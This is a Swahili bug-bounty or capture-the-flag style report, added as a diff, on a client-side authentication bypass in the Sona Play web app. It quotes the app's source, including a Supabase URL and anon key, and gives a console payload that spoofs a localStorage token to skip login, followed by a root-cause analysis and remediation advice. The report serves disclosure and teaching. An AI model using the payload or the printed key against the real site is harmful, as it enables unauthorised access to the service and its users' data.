@@ -1,0 +1,209 @@
+RIPOTI YA UKAGUZI WA KIUSALAMA (BUG BOUNTY REPORT)
+Link: https://sonamplay.netlify.app/
+
+Author: Mr system
+
+1. Taarifa za Jumla (General Information)
+Jina la Changamoto / Mfumo: Sona Play Application
+Aina ya Udhaifu: Broken Access Control / Client-Side Authentication Bypass
+Kiwango cha Hatari: Kiwango cha Juu (High)Athari: Mshambuliaji anaweza kukwepa mfumo wa Login na kuingia
+ndani ya akaunti ya mfumo bila barua pepe (email) wala neno la siri (password).
+
+
+
+2. Maelezo Mafupi (Executive Summary)
+Wakati wa kufanya ukaguzi wa kiusalama kwenye mfumo wa Sona Play, tuligundua udhaifu mkubwa wa kiusalama 
+unaopatikana kwenye mantiki ya kodi iliyo upande wa mteja (Client-Side Logic Vulnerability).
+Udhaifu huu unamruhusu mtu yeyote kukwepa mfumo mzima wa usajili na uingiaji (Authentication Bypass) 
+na kufikia kurasa za ndani za mfumo zilizolindwa (pamoja na kupata "Flag") bila kuhitaji taarifa zozote halali za akaunti.
+
+'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+3. Udhaifu Uliogundulika (Vulnerabilities Discovered)
+'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+
+   I.Information Disclosure (Ufichuaji wa Taarifa):
+Kodi ya JavaScript ya mfumo ilionyesha wazi funguo za siri za hifadhidata ya Supabase (SUPA_URL na SUPA_ANON_KEY).
+.................................................................................................................
+   II.Security Through Obscurity (Ulinzi wa Kificho): 
+Mfumo ulijaribu kuzuia matumizi ya kubofya kulia (Right-Click) na vitufe vya ukaguzi (F12),
+lakini ulinzi huu hausaidii kwani ni rahisi kuukwepa.
+................................................................................................................
+  III.Flawed Offline Authentication Logic:
+Mfumo una mantiki ya "Offline Boot" ambayo inaamini na kukubali uwepo wa token yoyote kwenye 
+localStorage ya kivinjari bila kuithibitisha upande wa seva (Server-side validation).
+...............................................................................................................
+
+4. Hatua kwa Hatua za Utekelezaji (Steps to Reproduce)
+Hatua ya kwanza
+1: Kukagua Source CodeKivinjari kilikuwa kimezuiliwa kufungua Inspect Element. 
+Tulikwepa ulinzi huu kwa kutumia amri ya view-source: moja kwa moja kwenye Address Bar ya kivinjari:
+
+
+    ##############################################
+    view-source:https://[tovuti-ya-changamoto].com
+    ##############################################
+
+Kwanini ilikubali? Kivinjari kina uwezo wa kusoma HTML ghafi kabla JavaScript ya tovuti haijaanza kufanya kazi ya kuzuia mtumiaji.
+
+
+script>
+const API='https://sonaplay.onrender.com/api';
+// ngrok free tier shows an interstitial warning page on first browser contact
+// unless this header is present - without it, requests get HTML back instead
+// of JSON, breaking search/stream/download.
+const _origFetch=window.fetch;
+window.fetch=function(url,opts={}){
+  if(typeof url==='string'&&url.startsWith(API)){
+    opts={...opts,headers:{...(opts.headers||{}),'bypass-tunnel-reminder':'true'}};
+  }
+  return _origFetch(url,opts);
+};
+const audio=document.getElementById('audio');
+
+// Swipe left/right on mini-player to skip tracks. Small threshold so a
+// normal tap (which opens the full player) still works fine.
+(function(){
+  const mini=document.getElementById('mini');
+  let sx=0,sy=0;
+  mini.addEventListener('touchstart',e=>{sx=e.touches[0].clientX;sy=e.touches[0].clientY;},{passive:true});
+  mini.addEventListener('touchend',e=>{
+    const dx=e.changedTouches[0].clientX-sx;
+    const dy=e.changedTouches[0].clientY-sy;
+    if(Math.abs(dx)>60&&Math.abs(dx)>Math.abs(dy)*2){
+      e.preventDefault(); // stop the tap-to-open-player click from also firing
+      if(dx<0)nextTrack();else prevTrack();
+    }
+  },{passive:false});
+})();
+
+// NOTE: volume normalization via Web Audio API was removed - it rewired
+// audio output through a separate AudioContext that got stuck in a
+// suspended state, causing playback to visually progress (timer ticking)
+// while producing zero actual sound. Reliability matters more than that
+// polish feature, so plain default audio output is used instead.
+
+// SUPABASE AUTH + PLAYLISTS
+// TODO: replace with your real project URL + anon key from Supabase dashboard > Settings > API
+const SUPA_URL='https://ioukidprmfvkkoohlpmy.supabase.co';
+const SUPA_ANON_KEY='eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImlvdWtpZHBybWZ2a2tvb2hscG15Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODY0NjAxODEsImV4cCI6MjEwMjAzNjE4MX0.BMrmsC_DMDX8HP7CMyJ3O3EUOC8IWAvbBk7rE5o4wIA';
+const sb=window.supabase.createClient(SUPA_URL,SUPA_ANON_KEY);
+let session=null;
+let authMode='login'; // 'login' | 'signup'
+
+function toggleAuthMode(){
+  authMode=authMode==='login'?'signup':'login';
+  document.getElementById('agName').style.display=authMode==='signup'?'block':'none';
+  document.getElementById('agSubmitBtn').textContent=authMode==='signup'?'Sign Up':'Log In';
+  document.getElementById('agSwitch').innerHTML=authMode==='signup'
+    ?'Already have an account? <span onclick="toggleAuthMode()">Log in</span>'
+    :'New to Sona Play? <span onclick="toggleAuthMode()">Create account</span>';
+  document.getElementById('agErr').textContent='';
+}
+
+async function handleAuthSubmit(){
+  const email=document.getElementById('agEmail').value.trim();
+  const pass=document.getElementById('agPass').value;
+  const name=document.getElementById('agName').value.trim();
+  const errEl=document.getElementById('agErr');
+  errEl.textContent='';
+  if(!email||!pass){errEl.textContent='Enter email and password';return;}
+  const btn=document.getElementById('agSubmitBtn');
+  btn.disabled=true;btn.textContent='Please wait…';
+  try{
+    if(authMode==='signup'){
+      const{data,error}=await sb.auth.signUp({email,password:pass,options:{data:{display_name:name||email.split('@')[0]}}});
+      if(error)throw error;
+      if(!data.session){
+        errEl.style.color='var(--v)';
+        errEl.textContent='Check your email to confirm your account, then log in.';
+        toggleAuthMode();
+        btn.disabled=false;btn.textContent='Log In';
+        return;
+      }
+      session=data.session;
+    }else{
+      const{data,error}=await sb.auth.signInWithPassword({email,password:pass});
+      if(error)throw error;
+      session=data.session;
+    }
+    document.getElementById('authGate').classList.remove('show');
+    enterMain();
+  }catch(e){
+    errEl.style.color='var(--c)';
+    errEl.textContent=e.message||'Something went wrong';
+  }finally{
+    btn.disabled=false;btn.textContent=authMode==='signup'?'Sign Up':'Log In';
+  }
+}
+
+// =====================================================================
+// WELCOME SCREEN
+// =====================================================================
+function showAuthGate(isSignup){
+  document.getElementById('welcomeGate').classList.remove('show');
+  if(isSignup&&authMode==='login')toggleAuthMode();
+  document.getElementById('authGate').classList.add('show');
+}
+
+
+
+Hatua ya 2: Uchambuzi wa Kodi (Source Code Analysis)
+Ndani ya kodi tuligundua kazi ya enterMain() inayohusika na kuingiza watumiaji ndani ya programu,
+na tukaona jinsi mfumo unavyotafuta token ya ndani inayoitwa sb-ioukidprmfvkkoohlpmy-auth-token kwenye kompyuta ya mtumiaji ili kuwaruhusu kuingia wakiwa offline.
+
+
+Hatua ya 3: Utekelezaji wa Payload (The Winning Payload)
+Tulifungua Developer Tools (Console) na kuendesha kodi ifuatayo ili kudanganya mfumo kuwa tayari mtumiaji alishawahi kuingia na ana token halali (Local Storage Spoofing),
+kisha tukaamuru mfumo ufungue kurasa za ndani:
+
+
+############################################################################################################
+
+// 1. Kutengeneza token feki ili kudanganya mantiki ya "Offline Boot"
+localStorage.setItem('sb-ioukidprmfvkkoohlpmy-auth-token', 'feke_token');
+
+// 2. Kuondoa na kuficha vizuizi vya fomu ya Login (Mageti ya ulinzi)
+if(document.getElementById('splash')) document.getElementById('splash').style.display='none';
+if(document.getElementById('authGate')) document.getElementById('authGate').classList.remove('show');
+if(document.getElementById('welcomeGate')) document.getElementById('welcomeGate').classList.remove('show');
+
+// 3. Kulazimisha ukurasa mkuu wa ndani uonyeshwe na kuamsha programu
+if(document.getElementById('main')) document.getElementById('main').classList.add('show');
+enterMain();
+
+##############################################################################################################
+
+
+4. Kwanini Payload Hii Ilikubali? (Root Cause Analysis)
+Payload hii ilifanya kazi kwa sababu mbili kuu:
+
+I.Ukosefu wa Server-Side Verification:
+Mfumo unamwamini mtumiaji anaposema "Nina token" (kupitia localStorage) bila kwenda kuithibitisha kwenye seva ya Supabase kama ni token halisi au la pindi 
+unapoingia (haswa katika mazingira yaliyotengenezwa kwa ajili ya offline).
+
+II.Kuhama kwa Mantiki ya Ulinzi kwenda kwa Mteja (Client-Side Authorization):
+Kazi zote za kufungua au kufunga mageti ya ulinzi (classList.remove('show') na enterMain()) zilikuwa zinasimamiwa na JavaScript iliyo upande wa mtumiaji, 
+na kumpa mshambuliaji uwezo wa kuziamuru zijiendeshe zenyewe kupitia Console.
+
+
+
+5. Ushauri wa Kiusalama (Mitigation/Remediation)
+
+I.Zima Kazi za Ndani Bila Thibitisho:
+Kamwe usimruhusu mtumiaji kufikia kazi muhimu kama enterMain() bila seva kuthibitisha kuwa kikao chake (session) ni halali.
+
+II.Row Level Security (RLS): 
+Washa ulinzi wa RLS kwenye hifadhidata ya Supabase ili hata kama mtu akipata SUPA_ANON_KEY asipate nafasi ya kusoma meza za ndani bila akaunti iliyothibitishwa.
+
+
+
+
+
+
+
+
+
+
+
+
+
